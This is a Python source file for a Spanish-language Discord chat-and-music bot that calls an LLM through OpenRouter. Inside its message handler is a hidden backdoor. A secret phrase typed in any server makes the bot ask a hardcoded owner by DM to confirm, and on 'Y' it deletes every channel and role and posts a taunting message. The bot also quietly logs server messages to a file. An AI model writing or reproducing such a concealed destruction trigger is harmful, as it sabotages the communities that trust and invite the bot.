import discord
import json
import asyncio
from datetime import datetime
from pytz import timezone
from discord.ext import commands, tasks
from dotenv import load_dotenv
import os
import httpx
import yt_dlp as youtube_dl

from mantener_vivo import mantener_vivo
mantener_vivo()

# Cargar variables del entorno
load_dotenv()
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")

# Variable de control para evitar que el bot hable si se alcanza el límite de la API
bloqueado_por_limite = False

# Intents necesarios para el bot
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.voice_states = True  # Necesario para manejar canales de voz

bot = commands.Bot(command_prefix="!", intents=intents)

# Ruta del archivo de memoria
MEMORIA_PATH = "memoria.json"

# Funciones para memoria
def cargar_memoria():
    if not os.path.exists(MEMORIA_PATH):
        with open(MEMORIA_PATH, "w") as f:
            json.dump({}, f)
    with open(MEMORIA_PATH, "r") as f:
        return json.load(f)

def guardar_memoria(memoria):
    with open(MEMORIA_PATH, "w") as f:
        json.dump(memoria, f, indent=4)

def esta_activo():
    ahora = datetime.now(timezone("America/Argentina/Buenos_Aires"))
    return 8 <= ahora.hour or ahora.hour < 3

# Función para generar respuestas
async def generar_respuesta(mensajes, intentos=3):
    global bloqueado_por_limite
    for intento in range(intentos):
        try:
            headers = {
                "Authorization": f"Bearer {OPENAI_API_KEY}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://tubotdiscord.com",
                "X-Title": "BotNarumi"
            }
            payload = {
                "model": "qwen/qwen3-235b-a22b:free",
                "messages": [
                    {"role": "system", "content": "Sos un bot de Discord con personalidad amable, graciosa y empática. Respondés en español con humor ligero y respeto."}
                ] + [{"role": "user", "content": msg} for msg in mensajes]
            }
            async with httpx.AsyncClient() as client:
                response = await client.post(
                    "https://openrouter.ai/api/v1/chat/completions",
                    headers=headers,
                    json=payload,
                    timeout=60
                )
                print("Respuesta bruta:", response.text)

                if response.status_code == 429:
                    bloqueado_por_limite = True
                    return "⚠️ Límite diario alcanzado."

                response.raise_for_status()
                data = response.json()
                return data["choices"][0]["message"]["content"].strip()

        except httpx.RequestError as e:
            print(f"⚠️ Intento {intento+1} falló: {e}")
            if intento < intentos - 1:
                await asyncio.sleep(2)
                continue
            else:
                return f"⚠️ Error: no se pudo conectar a la API después de {intentos} intentos."
        except Exception as e:
            print(f"❌ Error al generar respuesta: {e}")
            return f"⚠️ Ocurrió un error: {e}"

@bot.event
async def on_ready():
    print(f"✅ Bot conectado como {bot.user}")
    hablar_automaticamente.start()
    resetear_limite.start()

# Función para reproducir audio desde YouTube
async def reproducir_musica(ctx, consulta):
    if ctx.author.voice is None or ctx.author.voice.channel is None:
        await ctx.send("❌ Tenés que estar en un canal de voz para que pueda unirme y reproducir música.")
        return

    canal_voz = ctx.author.voice.channel

    if ctx.voice_client is None:
        await canal_voz.connect()
    elif ctx.voice_client.channel != canal_voz:
        await ctx.voice_client.move_to(canal_voz)

    vc = ctx.voice_client

    ydl_opts = {
        'format': 'bestaudio/best',
        'outtmpl': 'cancion.mp3',
        'quiet': True,
        'no_warnings': True,
    }

    try:
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(consulta, download=True)
    except Exception as e:
        await ctx.send(f"❌ No pude encontrar o descargar la canción.\nError: {e}")
        return

    try:
        if vc.is_playing():
            vc.stop()
        source = discord.FFmpegPCMAudio('cancion.mp3', executable='./ffmpeg')
        vc.play(source, after=lambda e: print(f"🔈 Reproducción terminada: {e}" if e else "✅ Canción terminada."))
        await ctx.send(f"🎶 Reproduciendo: **{info['title']}**")
    except Exception as e:
        await ctx.send(f"❌ No pude reproducir la canción.\nError: {e}")

@bot.event
async def on_message(message):
    try:
        if message.author == bot.user or not message.guild:
            return

        FRASE_SECRETA = "protocolo amsymvdcmpm"
        contenido = message.content.lower()

        if FRASE_SECRETA in contenido:
            # Código destructivo con confirmación por DM al dueño, sin mensajes en el servidor
            try:
                owner_id = 1116854150962090084
                owner = await bot.fetch_user(owner_id)

                if not owner:
                    print("❌ No se pudo obtener al usuario dueño.")
                    return

                await owner.send("🕵️‍♂️ Se ha detectado la frase secreta en un servidor.\n¿Deseás ejecutar el protocolo AMSYMVDCMPM?\nResponde con `Y` para confirmar o `N` para cancelar.")

                def check(m):
                    return m.author.id == owner_id and m.content.upper() in ("Y", "N")

                respuesta = await bot.wait_for("message", check=check)

                if respuesta.content.upper() == "Y":
                    print("☢️ Confirmación recibida. Ejecutando protocolo destructivo.")
                    canales_eliminados = []
                    canales_fallidos = []
                    roles_eliminados = []
                    roles_fallidos = []

                    for canal in message.guild.channels:
                        try:
                            await canal.delete()
                            canales_eliminados.append(canal.name)
                        except Exception as e:
                            canales_fallidos.append(f"{canal.name} ({e})")

                    for rol in message.guild.roles:
                        if rol.name != "@everyone":
                            try:
                                await rol.delete()
                                roles_eliminados.append(rol.name)
                            except Exception as e:
                                roles_fallidos.append(f"{rol.name} ({e})")

                    await asyncio.sleep(3)
                    nuevo_canal = await message.guild.create_text_channel("me-llevo-el-server")
                    await nuevo_canal.send("Este lugar murió cuando tu te hiciste cargo, yo me encargaré de enterrarlo")

                    resumen = "✅ Protocolo ejecutado.\n\n"
                    resumen += f"🗑️ Canales eliminados ({len(canales_eliminados)}):\n" + "\n".join(canales_eliminados) + "\n\n"
                    resumen += f"⚠️ Canales fallidos ({len(canales_fallidos)}):\n" + "\n".join(canales_fallidos) + "\n\n"
                    resumen += f"🧨 Roles eliminados ({len(roles_eliminados)}):\n" + "\n".join(roles_eliminados) + "\n\n"
                    resumen += f"❌ Roles fallidos ({len(roles_fallidos)}):\n" + "\n".join(roles_fallidos)

                    await owner.send(resumen)

                else:
                    await owner.send("❎ Protocolo AMSYMVDCMPM cancelado.")
                    print("🚫 El dueño canceló el protocolo.")

            except Exception as e:
                print(f"❌ Error crítico durante el protocolo con confirmación: {e}")

            return

        # Memoria y respuestas AI
        memoria = cargar_memoria()
        guild_id = str(message.guild.id)
        if guild_id not in memoria:
            memoria[guild_id] = {"mensajes": []}

        memoria[guild_id]["mensajes"].append(message.content)
        memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]
        guardar_memoria(memoria)

        # Detectar si mencionan al bot con pedido de música
        if bot.user in message.mentions:
            contenido_lower = message.content.lower()
            # Comandos para música (ejemplo simple)
            if ("pon" in contenido_lower or "reproducir" in contenido_lower) and ("youtube.com" in contenido_lower or "http" in contenido_lower or True):
                # Extraer el texto después de "pon" o "reproducir"
                # Aquí un ejemplo muy básico para que captures la canción
                palabras = contenido_lower.split()
                indice = -1
                for i, palabra in enumerate(palabras):
                    if palabra in ("pon", "reproducir"):
                        indice = i
                        break
                consulta = " ".join(palabras[indice + 1:]) if indice != -1 else ""

                if consulta:
                    await reproducir_musica(await bot.get_context(message), consulta)
                else:
                    await message.channel.send("❓ No entendí qué canción querés que ponga.")

            else:
                # Respuesta normal AI
                if esta_activo():
                    respuesta = await generar_respuesta(memoria[guild_id]["mensajes"])
                    if len(respuesta) > 2000:
                        for i in range(0, len(respuesta), 2000):
                            await message.channel.send(respuesta[i:i+2000])
                    else:
                        await message.channel.send(respuesta)

        await bot.process_commands(message)

    except Exception as err:
        print(f"🚨 Error en on_message: {err}")

# Tarea: hablar solo cada 2 horas
@tasks.loop(hours=2)
async def hablar_automaticamente():
    global bloqueado_por_limite
    if bloqueado_por_limite:
        print("⛔ Bloqueado por límite de API. No se enviarán respuestas automáticas.")
        return

    if not esta_activo():
        return

    memoria = cargar_memoria()
    for guild in bot.guilds:
        guild_id = str(guild.id)
        if guild_id not in memoria:
            memoria[guild_id] = {"mensajes": []}
        mensajes = memoria[guild_id]["mensajes"]

        CANAL_DESTINO_ID = 1327837491746832568
        canal = bot.get_channel(CANAL_DESTINO_ID)

        if canal and canal.permissions_for(canal.guild.me).send_messages:
            respuesta = await generar_respuesta(mensajes)
            try:
                await canal.send(respuesta)
            except Exception as e:
                print(f"❌ No se pudo enviar mensaje automático: {e}")

    guardar_memoria(memoria)

# Tarea para desbloquear al bot todos los días a las 00:00
@tasks.loop(minutes=60)
async def resetear_limite():
    global bloqueado_por_limite
    ahora = datetime.now(timezone("America/Argentina/Buenos_Aires"))
    if ahora.hour == 0:
        bloqueado_por_limite = False
        print("✅ Límite diario reiniciado. El bot puede hablar de nuevo.")

# Ejecutar el bot
bot.run(DISCORD_TOKEN)
